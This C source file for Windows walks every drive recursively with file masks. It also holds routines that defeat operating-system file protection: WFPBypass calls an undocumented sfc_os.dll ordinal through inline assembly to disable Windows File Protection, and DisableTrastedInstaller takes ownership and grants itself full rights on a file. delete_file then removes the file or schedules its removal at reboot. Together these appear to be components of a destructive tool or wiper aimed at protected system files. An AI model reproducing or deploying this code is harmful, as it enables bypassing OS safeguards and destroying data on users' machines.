﻿#include <Windows.h>
#include "common.h"
#include "find.h"
#include <stdlib.h>
#include <stdio.h>
#include <io.h>

typedef BOOL (_stdcall *tSfcIsFileProtected)(
  _In_  HANDLE RpcHandle,
  _In_  LPCWSTR ProtFileName
);

bool is_file_protected(wchar_t *fname){
	bool r=false;
	static tSfcIsFileProtected SfcIsFileProtected=0;
	if (!SfcIsFileProtected){
		HMODULE hm=LoadLibraryW(L"Sfc.dll");
		if (!hm) return r;
		SfcIsFileProtected=(tSfcIsFileProtected)GetProcAddress(hm,"SfcIsFileProtected");
		if (!SfcIsFileProtected) return r;
	}
	r=SfcIsFileProtected(0,fname)?true:false;
	return r;
}


void find_drive(wchar_t *mask,FUNC f,void *arg){
	wchar_t drive[20];
	SetErrorMode(SEM_FAILCRITICALERRORS);
	uint32 d=GetLogicalDrives();
	uint32 m=1;
	for (int i=0;i<32;i++){
		if (d&m){
			_snwprintf(drive,20-1,L"%c:",L'A'+i);
			uint32 t=GetDriveTypeW(drive);
			switch(t){
			case DRIVE_CDROM:
				break;
			default:{
				DWORD d1,d2,d3,d4;
				if (!GetDiskFreeSpaceW(drive,&d1,&d2,&d3,&d4)) break;
				find_dir(drive,mask,f,arg);				
				}break;
			}
		}
		m=m<<1;
	}
}


void find_file(wchar_t *dir, wchar_t *m,FUNC f,void *arg){
	WIN32_FIND_DATAW fd;
	wchar_t p[512];
	HANDLE hf;

	_snwprintf(p,sizeof(p)-1,L"%s\\%s",dir,m);
	hf = FindFirstFileW(p,&fd);
	if(hf==INVALID_HANDLE_VALUE){
		return ;
	}

	do{
		if (wcscmp(fd.cFileName,L"..") && wcscmp(fd.cFileName,L".")){
			_snwprintf(p,sizeof(p)-1,L"%s\\%s",dir,fd.cFileName);
			f(p,arg);
		}
	}while(FindNextFileW(hf,&fd));

	FindClose(hf);
}

void find_dir(wchar_t *dir, wchar_t *m,FUNC f,void *arg){
	WIN32_FIND_DATAW fd;
	wchar_t p[512];
	HANDLE hf;

	find_file(dir,m,f,arg);
	_snwprintf(p,sizeof(p)-1,L"%s\\*",dir);
	hf = FindFirstFileW(p,&fd);
	if(hf==INVALID_HANDLE_VALUE){
		return ;
	}
	
	do{
		if ((fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)){
			if (wcscmp(fd.cFileName,L"..") && wcscmp(fd.cFileName,L".")){
				_snwprintf(p,sizeof(p)-1,L"%s\\%s",dir,fd.cFileName);
				find_dir(p, m,f,arg);
			}
		}
	}while(FindNextFileW(hf,&fd));
	FindClose(hf);
}

bool DisableTrastedInstaller(wchar_t *fname){
	bool r=false;
	HANDLE hToken;
	if (!OpenProcessToken((HANDLE)-1,TOKEN_ALL_ACCESS,&hToken)){
		return r;
	}
	
	LUID luid;
	TOKEN_PRIVILEGES tp;
	memset(&tp,0,sizeof(tp));
	LookupPrivilegeValueA(0,"SeTakeOwnershipPrivilege",&tp.Privileges->Luid);
	tp.PrivilegeCount=1;
	tp.Privileges->Attributes=0x00000002;//SE_PRIVILEGE_ENABLE;
	
	if (!AdjustTokenPrivileges(hToken,0,&tp,sizeof(tp),0,0)){
		CloseHandle(hToken);
		return r;
	}
	
	DWORD rl;			
	GetTokenInformation(hToken,TokenUser,0,0,&rl);
	if (!rl){
		CloseHandle(hToken);
		return r;
	}
				
	PTOKEN_USER ptu=(PTOKEN_USER)m_malloc(rl);
	if (!ptu){
		CloseHandle(hToken);
		return r;
	}

	if (!GetTokenInformation(hToken,TokenUser,ptu,rl,&rl)){
		m_free(ptu);
		CloseHandle(hToken);
		return r;
	}
	
	rl=0;
	GetFileSecurityW(fname,DACL_SECURITY_INFORMATION,0,0,&rl);
	if (!rl){
		m_free(ptu);
		CloseHandle(hToken);
		return r;
	}
	
	PSECURITY_DESCRIPTOR psd=(PSECURITY_DESCRIPTOR)m_malloc(rl);
	if (!psd){
		m_free(ptu);
		CloseHandle(hToken);
		return r;
	}

	if (!GetFileSecurityW(fname,DACL_SECURITY_INFORMATION,psd,rl,&rl)){
		m_free(psd);
		m_free(ptu);
		CloseHandle(hToken);
		return r;
	}
							
	PACL pacl;
	BOOL dp,dp1;
	if (!GetSecurityDescriptorDacl(psd,&dp,&pacl,&dp1)){
		m_free(psd);
		m_free(ptu);
		CloseHandle(hToken);
		return r;
	}
								
	ACL_SIZE_INFORMATION asi;
	memset(&asi,0,sizeof(asi));
	if (!GetAclInformation(pacl,&asi,sizeof(asi),AclSizeInformation)){
		m_free(psd);
		m_free(ptu);
		CloseHandle(hToken);
		return r;
	}
	
	SECURITY_DESCRIPTOR sdnew;
	if (!InitializeSecurityDescriptor(&sdnew,SECURITY_DESCRIPTOR_REVISION)){
		m_free(psd);
		m_free(ptu);
		CloseHandle(hToken);
		return r;
	}
	
	DWORD lenAcl=asi.AclBytesInUse+sizeof(ACCESS_ALLOWED_ACE)-sizeof(DWORD); //sizeof(ACL)
	lenAcl+=GetLengthSid(ptu->User.Sid);
	PACL pnewacl=(PACL)m_malloc(lenAcl);
	if (!pnewacl){
		m_free(psd);
		m_free(ptu);
		CloseHandle(hToken);
		return r;
	}
										
	InitializeAcl(pnewacl,lenAcl,ACL_REVISION);
	//заполняю провами из старого ACL
	for (int i=0;i<asi.AceCount;i++){
		PACE_HEADER ace;
		GetAce(pacl,i,(LPVOID *)&ace);
		AddAce(pnewacl,ACL_REVISION,i,ace,ace->AceSize);
	}
	
	//права нового пользователя	
	if (!AddAccessAllowedAce(pnewacl, ACL_REVISION,GENERIC_ALL,ptu->User.Sid)){
		m_free(pnewacl);
		m_free(psd);
		m_free(ptu);
		CloseHandle(hToken);
		return r;
	}
											
	if (!SetSecurityDescriptorDacl(&sdnew,1,pnewacl,0)){
		m_free(pnewacl);
		m_free(psd);
		m_free(ptu);
		CloseHandle(hToken);
		return r;
	}
	
	if (!SetSecurityDescriptorOwner(&sdnew,ptu->User.Sid,0)){
		m_free(pnewacl);
		m_free(psd);
		m_free(ptu);
		CloseHandle(hToken);
		return r;
	}
	
	rl=0;
	if (!SetFileSecurityW(fname, OWNER_SECURITY_INFORMATION,&sdnew)){
		m_free(pnewacl);
		m_free(psd);
		m_free(ptu);
		CloseHandle(hToken);
		return r;
	}
	
	if (SetFileSecurityW(fname, DACL_SECURITY_INFORMATION,&sdnew)) r=true;

	m_free(pnewacl);
	m_free(psd);
	m_free(ptu);
	CloseHandle(hToken);
	r=true;
	return r;
}

bool WFPBypass(wchar_t *lpFileName){
  bool r=false;
  
  HMODULE hLib = LoadLibraryA("sfc_os.dll");
  if (!hLib) return r;
  PVOID func = GetProcAddress(hLib, MAKEINTRESOURCE(5)); 
  if (!func) return r;
  PVOID fname = &lpFileName;
  __asm 
  {
    push -1
    push fname
    push 0
    call  func
  }
  r=true;
  return r;
}

bool delete_file(wchar_t *fname){
	bool r=false;
	WFPBypass(fname);

	if (DeleteFileW(fname)){
		return true;
	}
	
	if(!DisableTrastedInstaller(fname)){
		return r;
	}
			
	if (DeleteFileW(fname)){
		return true;
	}
				
	wchar_t tmp[MAX_PATH];
	GetTempPathW(MAX_PATH,tmp);
	GetTempFileNameW(tmp,0,0,tmp);
	if (!MoveFileExW(fname,tmp,MOVEFILE_COPY_ALLOWED|MOVEFILE_REPLACE_EXISTING)){
		return r;
	}
							
	MoveFileExW(tmp,0,MOVEFILE_DELAY_UNTIL_REBOOT);
	r=true;
	return r;
}
